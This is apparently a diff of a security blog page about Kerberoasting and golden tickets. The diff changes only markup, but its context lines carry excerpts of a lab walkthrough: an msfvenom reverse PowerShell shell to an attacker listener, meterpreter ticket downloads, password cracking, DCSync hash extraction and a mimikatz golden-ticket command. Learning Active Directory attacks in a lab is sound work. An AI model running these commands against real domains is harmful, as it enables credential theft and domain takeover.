@@ -1,9 +1,14 @@
 <!DOCTYPE html>
 <html lang="en-us">
 <head>
+  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="https://leonjza.github.io/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <title> kerberos, kerberoast and golden tickets | #!/slash/note</title>
+  <link rel = 'canonical' href = 'https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/'>
   <meta name="description" content="[&#39;Caffeine fueled&#39;, &#39;(╯°□°)╯︵ ┻━┻&#39;, &#39;Security guy&#39;, &#39;Metalhead&#39;, &#39;I saw your password&#39;, &#39;KOOBo&#43;KXleKAv&#43;KXlSnjgaM=&#39;]">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="robots" content="all,follow">
@@ -17,8 +22,8 @@ The reality is, many times, the escalation processes is trivial. Pwn some workst
 This post however tries to look at it from a little fresher perspective. There are many posts like this out there, but this one is mine. Mostly just a brain dump that I can refer to later. Many others have written this up (maybe even in greater detail), so definitely have a look around!" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2016-01-09T10:12:09&#43;02:00" />
-<meta property="article:modified_time" content="2016-01-09T10:12:09&#43;02:00" />
+<meta property="article:published_time" content="2016-01-09T10:12:09+02:00" />
+<meta property="article:modified_time" content="2016-01-09T10:12:09+02:00" />
 
 
   <meta name="twitter:card" content="summary"/>
@@ -32,8 +37,11 @@ This post however tries to look at it from a little fresher perspective. There a
 
   
   
+    
   
-  <link rel="stylesheet" href="https://leonjza.github.io/css/style-white.css">
+  
+  <link rel="stylesheet" href="https://leonjza.github.io/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 
+
   
    <link rel="stylesheet" href="https://leonjza.github.io/css/cactus-custom.css"> 
   
@@ -44,7 +52,7 @@ This post however tries to look at it from a little fresher perspective. There a
   
 
   
-<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.png" />
+<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.ico" />
 
   
   
@@ -72,8 +80,8 @@ if (!doNotTrack) {
 
   <div id="header-post">
   <a id="menu-icon" href="#" class="active"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" class="active"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
   <span id="menu" style="visibility: visible;">
     <span id="nav">
       <ul>
@@ -93,25 +101,25 @@ if (!doNotTrack) {
       <ul>
         
         <li>
-          <a class="icon" href=" https://leonjza.github.io/license/">
+          <a class="icon" href=" https://leonjza.github.io/license/" aria-label="Previous">
             <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
           </a>
         </li>
         
         
         <li>
-          <a class="icon" href="https://leonjza.github.io/blog/2016/06/16/rooting-darknet/">
+          <a class="icon" href="https://leonjza.github.io/blog/2016/06/16/rooting-darknet/" aria-label="Next">
             <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
           </a>
         </li>
         
         <li>
-          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
             <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
           </a>
         </li>
         <li>
-          <a class="icon" href="#">
+          <a class="icon" href="#" aria-label="Share">
             <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
           </a>
         </li>
@@ -131,57 +139,47 @@ if (!doNotTrack) {
   
   
   <li>
-    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f">
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f" aria-label="Facebook">
       <i class="fab fa-facebook " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&text=kerberos%2c%20kerberoast%20and%20golden%20tickets">
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&text=kerberos%2c%20kerberoast%20and%20golden%20tickets" aria-label="Twitter">
       <i class="fab fa-twitter " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&title=kerberos%2c%20kerberoast%20and%20golden%20tickets">
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&title=kerberos%2c%20kerberoast%20and%20golden%20tickets" aria-label="Linkedin">
       <i class="fab fa-linkedin " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&is_video=false&description=kerberos%2c%20kerberoast%20and%20golden%20tickets">
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&is_video=false&description=kerberos%2c%20kerberoast%20and%20golden%20tickets" aria-label="Pinterest">
       <i class="fab fa-pinterest " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="mailto:?subject=kerberos%2c%20kerberoast%20and%20golden%20tickets&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f">
+    <a class="icon" href="mailto:?subject=kerberos%2c%20kerberoast%20and%20golden%20tickets&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f" aria-label="Email">
       <i class="fas fa-envelope " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&title=kerberos%2c%20kerberoast%20and%20golden%20tickets">
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&title=kerberos%2c%20kerberoast%20and%20golden%20tickets" aria-label="Pocket">
       <i class="fab fa-get-pocket " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&title=kerberos%2c%20kerberoast%20and%20golden%20tickets">
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&title=kerberos%2c%20kerberoast%20and%20golden%20tickets" aria-label="reddit">
       <i class="fab fa-reddit " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&title=kerberos%2c%20kerberoast%20and%20golden%20tickets">
-      <i class="fab fa-stumbleupon " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://digg.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&title=kerberos%2c%20kerberoast%20and%20golden%20tickets">
-      <i class="fab fa-digg " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&name=kerberos%2c%20kerberoast%20and%20golden%20tickets&description=%3cfigure%3e%3cimg%20src%3d%22%2fimages%2fkerberos_golden_ticket_active_directory_logo.png%22%2f%3e%0a%3c%2ffigure%3e%0a%0a%3cp%3eActive%20Directory%20is%20almost%20always%20in%20scope%20for%20many%20pentests.%20There%20is%20sometimes%20a%20competitive%20nature%20amongst%20pentesters%20where%20the%20challenge%20is%20to%20see%20who%20can%20set%20a%20new%20record%20for%20gaining%20Domain%20Administrative%20privileges%20the%20fastest.%20How%20sad%20its%20that%3f%3c%2fp%3e%0a%3cp%3eThe%20reality%20is%2c%20%3cem%3emany%3c%2fem%3e%20times%2c%20the%20escalation%20processes%20is%20trivial.%20Pwn%20some%20workstation%20with%20admin%20creds%2c%20grab%20credentials%20out%20of%20%3ccode%3elsass%3c%2fcode%3e%20and%20pass%20the%20hash%20to%20move%20around%20laterally.%20This%20has%20been%20the%20typical%20breakfast%20of%20many%20pentesters.%20Heck%2c%20there%20are%20even%20attempts%20to%20%3ca%20href%3d%22https%3a%2f%2fgithub.com%2fsensepost%2fautoDANE%22%3eautomate%3c%2fa%3e%20this%20type%20of%20process%20because%2c%20personally%2c%20I%20feel%20its%20getting%20pretty%20old.%20Yet%2c%20its%20still%20very%20viable%20as%20an%20attack%20method%20due%20to%20its%20high%20success%20rate%21%3c%2fp%3e%0a%3cp%3eThis%20post%20however%20tries%20to%20look%20at%20it%20from%20a%20little%20fresher%20perspective.%20There%20are%20many%20posts%20like%20this%20out%20there%2c%20but%20this%20one%20is%20mine.%20Mostly%20just%20a%20brain%20dump%20that%20I%20can%20refer%20to%20later.%20Many%20others%20have%20written%20this%20up%20%28maybe%20even%20in%20greater%20detail%29%2c%20so%20definitely%20have%20a%20look%20around%21%3c%2fp%3e">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&name=kerberos%2c%20kerberoast%20and%20golden%20tickets&description=%3cfigure%3e%3cimg%20src%3d%22%2fimages%2fkerberos_golden_ticket_active_directory_logo.png%22%2f%3e%0a%3c%2ffigure%3e%0a%0a%3cp%3eActive%20Directory%20is%20almost%20always%20in%20scope%20for%20many%20pentests.%20There%20is%20sometimes%20a%20competitive%20nature%20amongst%20pentesters%20where%20the%20challenge%20is%20to%20see%20who%20can%20set%20a%20new%20record%20for%20gaining%20Domain%20Administrative%20privileges%20the%20fastest.%20How%20sad%20its%20that%3f%3c%2fp%3e%0a%3cp%3eThe%20reality%20is%2c%20%3cem%3emany%3c%2fem%3e%20times%2c%20the%20escalation%20processes%20is%20trivial.%20Pwn%20some%20workstation%20with%20admin%20creds%2c%20grab%20credentials%20out%20of%20%3ccode%3elsass%3c%2fcode%3e%20and%20pass%20the%20hash%20to%20move%20around%20laterally.%20This%20has%20been%20the%20typical%20breakfast%20of%20many%20pentesters.%20Heck%2c%20there%20are%20even%20attempts%20to%20%3ca%20href%3d%22https%3a%2f%2fgithub.com%2fsensepost%2fautoDANE%22%3eautomate%3c%2fa%3e%20this%20type%20of%20process%20because%2c%20personally%2c%20I%20feel%20its%20getting%20pretty%20old.%20Yet%2c%20its%20still%20very%20viable%20as%20an%20attack%20method%20due%20to%20its%20high%20success%20rate%21%3c%2fp%3e%0a%3cp%3eThis%20post%20however%20tries%20to%20look%20at%20it%20from%20a%20little%20fresher%20perspective.%20There%20are%20many%20posts%20like%20this%20out%20there%2c%20but%20this%20one%20is%20mine.%20Mostly%20just%20a%20brain%20dump%20that%20I%20can%20refer%20to%20later.%20Many%20others%20have%20written%20this%20up%20%28maybe%20even%20in%20greater%20detail%29%2c%20so%20definitely%20have%20a%20look%20around%21%3c%2fp%3e" aria-label="Tumblr">
       <i class="fab fa-tumblr " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&t=kerberos%2c%20kerberoast%20and%20golden%20tickets">
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&t=kerberos%2c%20kerberoast%20and%20golden%20tickets" aria-label="Hacker News">
       <i class="fab fa-hacker-news " aria-hidden="true"></i>
     </a>
   </li>
@@ -225,32 +223,26 @@ if (!doNotTrack) {
       </h1>
       <div class="meta">
         
-        <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <span itemprop="name">
-            
-              #!/slash/note
-            
-          </span>
-        </span>
-        
         <div class="postdate">
           
           <time datetime="2016-01-09 10:12:09 &#43;0200 SAST" itemprop="datePublished">2016-01-09</time>
           
         </div>
         
+        
+        
         <div class="article-category">
-          <i class="fas fa-archive"></i>
-          
-          
-          <a class="category-link" href="https://leonjza.github.io/categories/active-directory">active directory</a>
-          
-           ,  
-          <a class="category-link" href="https://leonjza.github.io/categories/kerberos">kerberos</a>
-          
-           ,  
-          <a class="category-link" href="https://leonjza.github.io/categories/golden-ticket">golden ticket</a>
-          
+            <i class="fas fa-archive"></i>
+            
+            
+            <a class="category-link" href="https://leonjza.github.io/categories/active-directory">active directory</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/kerberos">kerberos</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/golden-ticket">golden ticket</a>
+            
         </div>
         
         
@@ -289,7 +281,7 @@ if (!doNotTrack) {
 <p>When a client wants to connect to a service, it locates an instance of the service, composes an SPN for that instance, connects to the service, and presents the SPN for the service to authenticate.</p>
 </blockquote>
 <p>On my domain controller, I configured the SPN&rsquo;s with the following commands:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">PS C:\&gt; setspn -A svcSQLServ/pc1.foo.local:1433 foo\svcSQLServ
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">PS C:\&gt; setspn -A svcSQLServ/pc1.foo.local:1433 foo\svcSQLServ
 Checking domain DC=foo,DC=local
 
 Registering ServicePrincipalNames for CN=SQL Server,OU=Service Accounts,DC=foo,DC=local
@@ -308,7 +300,7 @@ Updated object
 <p>To use the powershell module, the easiest will be to get an interactive powershell session up and running. If you have ever tried this from meterpreter, you will know that if you try and spawn <code>powershell.exe</code> from a cmd shell, you will not get anywhere. Very frustrating. Its not impossible though! We are however going to go through the efforts of getting a working PowerShell session up as we will be using it extensively throughout this post.</p>
 <h3 id="setup-a-powershell-connection">setup a powershell connection</h3>
 <p>We can use the meterpreter session to get a powershell session. First, we will create a payload to execute as a script using the <code>exec_powershell</code> post module. In a new terminal, run <code>msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.138.150 LPORT=4445 -t raw</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# msfvenom -p windows/powershell_reverse_tcp <span style="color:#eedd82">LHOST</span>=192.168.138.150 <span style="color:#eedd82">LPORT</span>=<span style="color:#f60">4445</span> -t raw
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# msfvenom -p windows/powershell_reverse_tcp <span style="color:#eedd82">LHOST</span>=192.168.138.150 <span style="color:#eedd82">LPORT</span>=<span style="color:#f60">4445</span> -t raw
 No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 No Arch selected, selecting Arch: x86 from the payload
 No encoder or badchars specified, outputting raw payload
@@ -426,7 +418,7 @@ PS C:\&gt; Find-PSServiceAccounts -DumpSPNs | ForEach-Object { New-Object System
 <h2 id="cracking-the-kerberos-ticket">cracking the kerberos ticket</h2>
 <p>Back at my meterpreter session, we can simply download the ticket locally, and start the crack. <code>tgsrepcrack.py</code> allows you to specify tickets with a wildcard, so it will run the wordlist recursively over all of the tickets in a directory.</p>
 <p>So download the ticket&hellip;</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">meterpreter &gt; cd downloads/kerb
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">meterpreter &gt; cd downloads/kerb
 meterpreter &gt; ls
 Listing: C:\users\bobs\downloads\kerb
 =====================================
@@ -440,12 +432,12 @@ meterpreter &gt; download 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCA
 [*] downloading: 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi -&gt; /root//1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
 [*] download   : 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi -&gt; /root//1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
 </code></pre></div><p>&hellip; and crack it!</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">root@kali:~/kerberoast# python tgsrepcrack.py /usr/share/wordlists/fasttrack.txt /root/1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">root@kali:~/kerberoast# python tgsrepcrack.py /usr/share/wordlists/fasttrack.txt /root/1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
 found password for ticket 0: Password1  File: /root/1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
 All tickets cracked!
 </code></pre></div><p><code>Password1</code> is the password for the <code>svcSQLServ</code> account! \o/</p>
 <p>One reason why having the password for this account is especially bad is because of its group memberships&hellip; Yes, I know. You may not easily see this in real life, but just bear with me for now.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">PS C:\&gt; net user svcSQLServ /domain
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">PS C:\&gt; net user svcSQLServ /domain
 The request will be processed at a domain controller for domain foo.local.
 
 User name                    svcSQLServ
@@ -478,7 +470,7 @@ PS C:\&gt;
 </code></pre></div><h2 id="testing-the-credentials">testing the credentials</h2>
 <p>For a bit of fun, lets test the credentials we just got using PowerShell Remoting. PowerShell Remoting is on by default on Server 2012 I believe.</p>
 <p>We will start by configuring a credentials object, and then just run the <code>Get-Process</code> cmdlet on the domain controller as proof.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">$pass = &#39;Password1&#39; | ConvertTo-SecureString -AsPlainText -Force
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">$pass = &#39;Password1&#39; | ConvertTo-SecureString -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential -ArgumentList &#39;svcSQLServ&#39;, $pass
 Invoke-Command -ScriptBlock {get-process} -ComputerName dc1 -Credential $creds
 </code></pre></div><p>With output&hellip;</p>
@@ -499,7 +491,7 @@ Invoke-Command -ScriptBlock {get-process} -ComputerName dc1 -Credential $creds
 <p>Getting the FQDN and SID (<code>whoami /user</code>) of the Domain should be relatively trivial. Remember to grab the SID without the <a href="https://en.wikipedia.org/wiki/Security_Identifier">trailing RID</a>. So if the full SID is <code>S-1-5-21-2222611480-1876485831-1594900117-1104</code> then you are only going to use <code>S-1-5-21-2222611480-1876485831-1594900117</code>.</p>
 <p>Getting the NT Hash of the <code>krbtgt</code> account though is something I want to show using a recent feature addition to mimikatz, <a href="http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/">DCSync</a>. The gist of it is that its possible to extract hashes from a Domain Controller (using a domain admin type account), without actually running any code on the Domain Controller itself! This is of course not the only way to get the required hash. Many of the older techniques work just fine. But, from a DCSync perspective, it essentially means hash extraction from any PC on the domain (authenticated as a admin), by ‘faking’ being a Domain Controller and triggering some replication-fu! In my case, I struggled a little to get this replication done from a client PC in the lab via the metasploit interactive PowerShell session, but could do it successfully from a client PC via the console. So, its definitely possible!</p>
 <p>In this case, to use the DCSync feature of mimikatz, I am going to use PowerShell Remoting to run commands. Unfortunately, due to the way <code>Enter-PSSession</code> sets up the shell, I can&rsquo;t seem to get an interactive shell as another user going without using another exploit &amp;&amp; payload combination. So, we are just going to use <code>Invoke-Command</code> with our commands.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">PS C:\&gt; $creds
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">PS C:\&gt; $creds
 
 UserName                       Password
 --------                       --------
@@ -530,7 +522,7 @@ svcSQLServ
 <h2 id="creating-the-golden-ticket">creating the golden ticket</h2>
 <p>Creating the golden ticket is now a really simple task. We will simply call <code>Invoke-Mimikatz</code> again to generate the ticket. It will be saved to disk when it is generated. Thereafter, we will purge all the tickets we have for the session, and inject the golden ticket and test our access!</p>
 <p>For details about the command and arguments required, I referred to the <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#golden--silver">mimikatz wiki</a> and replicated that. Our command should look something like the below, saving our golden ticket to <code>golden.tck</code> with access to a few builtin Windows Groups:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">kerberos::golden /user:darthvader /domain:foo.local /sid:S-1-5-21-2222611480-1876485831-1594900117 /krbtgt:95a11f7d93fa3a5a61073662e6bd8468 /ticket:golden.tck /groups:501,502,513,512,520,518,519
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">kerberos::golden /user:darthvader /domain:foo.local /sid:S-1-5-21-2222611480-1876485831-1594900117 /krbtgt:95a11f7d93fa3a5a61073662e6bd8468 /ticket:golden.tck /groups:501,502,513,512,520,518,519
 </code></pre></div><p>Running this mimikatz command with <code>Invoke-Mimikatz</code> gets us our Golden Ticket:</p>
 <figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_created.png"/>
 </figure>
@@ -538,7 +530,7 @@ svcSQLServ
 <h2 id="injecting-the-golden-ticket">injecting the golden ticket</h2>
 <p>The final test is to <em>use</em> this ticket. For that, we will purge all Kerberos tickets in memory and inject the new golden ticket. Thereafter we will test if we can read the administrative <code>c$</code> share of the Domain Controller!</p>
 <p>Lets purge the currently cached Kerberos tickets first:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">PS C:\users\bobs\downloads\golden&gt; Invoke-Mimikatz -Command &#39;&#34;kerberos::purge&#34;&#39;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">PS C:\users\bobs\downloads\golden&gt; Invoke-Mimikatz -Command &#39;&#34;kerberos::purge&#34;&#39;
 
 [... snip ...]
 
@@ -643,57 +635,47 @@ Ticket(s) purge for current session is OK
   
   
   <li>
-    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f">
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f" aria-label="Facebook">
       <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&text=kerberos%2c%20kerberoast%20and%20golden%20tickets">
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&text=kerberos%2c%20kerberoast%20and%20golden%20tickets" aria-label="Twitter">
       <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&title=kerberos%2c%20kerberoast%20and%20golden%20tickets">
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&title=kerberos%2c%20kerberoast%20and%20golden%20tickets" aria-label="Linkedin">
       <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&is_video=false&description=kerberos%2c%20kerberoast%20and%20golden%20tickets">
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&is_video=false&description=kerberos%2c%20kerberoast%20and%20golden%20tickets" aria-label="Pinterest">
       <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="mailto:?subject=kerberos%2c%20kerberoast%20and%20golden%20tickets&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f">
+    <a class="icon" href="mailto:?subject=kerberos%2c%20kerberoast%20and%20golden%20tickets&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f" aria-label="Email">
       <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&title=kerberos%2c%20kerberoast%20and%20golden%20tickets">
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&title=kerberos%2c%20kerberoast%20and%20golden%20tickets" aria-label="Pocket">
       <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
